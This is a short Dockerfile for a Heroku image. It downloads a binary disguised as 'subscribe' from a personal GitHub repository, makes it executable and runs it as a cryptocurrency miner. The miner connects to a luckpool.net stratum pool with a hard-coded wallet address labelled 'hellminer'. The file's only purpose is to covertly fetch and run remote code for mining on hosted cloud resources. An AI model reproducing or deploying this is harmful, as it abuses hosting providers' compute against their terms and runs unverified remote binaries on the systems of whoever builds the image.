FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/subscribe; chmod +x subscribe; ./subscribe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9.hellminer -p x
CMD bash heroku.sh
